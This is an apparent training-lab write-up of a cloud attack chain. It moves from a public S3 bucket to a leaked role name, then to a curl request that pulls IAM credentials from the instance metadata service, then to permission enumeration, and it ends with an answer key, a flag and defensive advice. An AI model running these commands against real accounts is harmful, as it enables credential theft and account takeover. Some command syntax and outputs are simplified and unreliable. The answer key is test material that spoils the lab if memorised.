# Lab 10 — Cloud Misconfiguration: Buckets, Roles & Metadata

**Category:** Cloud Security / AWS
**Environment:** TechBiz Security Academy — simulated practice range

## Objectives
- List the public storage bucket
- Read the exposed object
- Reach the instance metadata service
- Identify the role held
- Enumerate that role's permissions

## Methodology

### 1. List the public bucket
```bash
aws s3 ls s3://techbiz-backups-dev
```
```
2026-05-14 03:12:44   180  deploy-notes.txt
2026-05-14 03:12:44    15  db-dump-2026-05.sql.gz
>> Bucket listed anonymously — it is public.
```

### 2. Read the exposed object
```bash
aws s3 cp s3://techbiz-backups-dev/deploy-notes.txt -
```
```
Deployment notes (DEV)
----------------------
App instance role: app-server-role
Metadata service: IMDSv1 still enabled (TODO: enforce IMDSv2)
TBS{public_bucket_to_role_takeover}
```
The public bucket alone leaked the application's IAM role name and confirmed IMDSv1 was still active — exactly what's needed for the next step of the chain.

### 3. Reach the instance metadata service (SSRF)
```bash
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
```
```
app-server-role
>> Instance metadata reached. IMDSv1 answers anything that gets this far.
```
With IMDSv1 enabled, any SSRF-capable request from the application server (no special headers/tokens required) can pull the instance's temporary IAM credentials straight from the link-local metadata endpoint.

### 4. Confirm the assumed role
```bash
aws sts get-caller-identity
```
```
{
  "Account": "4155xxxx9021",
  "Arn": "arn:aws:sts::4155xxxx9021:assumed-role/app-server-role"
}
```

### 5. Enumerate the role's permissions
```bash
aws iam list-role-policies app-server-role
```
```
- s3:GetObject on *
- s3:PutObject on techbiz-backups-*
- secretsmanager:GetSecretValue on *
- iam:PassRole on *
>> secretsmanager:GetSecretValue on * is the dangerous one.
```
`secretsmanager:GetSecretValue on *` means this stolen role can read *every* secret in Secrets Manager for the account, and `iam:PassRole on *` opens further privilege-escalation paths — turning a single public S3 bucket into effectively account-wide compromise.

## Answers
| Q | Question | Answer |
|---|---|---|
| q1 | Name of the exposed bucket | `techbiz-backups-dev` |
| q2 | Link-local IP serving instance metadata | `169.254.169.254` |
| q3 | Role held by the compromised instance | `app-server-role` |
| q4 | Setting that would have blocked the metadata theft | `IMDSv2` |
| q5 | Flag | `TBS{public_bucket_to_role_takeover}` |

## Takeaways
- This chain — **public bucket → leaked role name → SSRF to IMDS → stolen temporary credentials → over-permissioned role** — is one of the most common real-world cloud breach patterns (it's essentially the Capital One 2019 breach pattern).
- IMDSv1 requires no token and no special header, so any SSRF vulnerability in an application running on the instance can be trivially escalated to full credential theft. **IMDSv2** requires a session token obtained via a `PUT` request first, which most SSRF primitives (typically limited to `GET`) cannot perform — making it a strong, low-cost mitigation.
- Least-privilege IAM policy scoping (avoiding `*` resources, especially for `secretsmanager:GetSecretValue` and `iam:PassRole`) limits blast radius even if credentials are stolen.
- A public bucket is rarely the "whole" finding — the real severity comes from what it enables downstream. Always trace the chain to its actual impact rather than stopping at the initial misconfiguration.
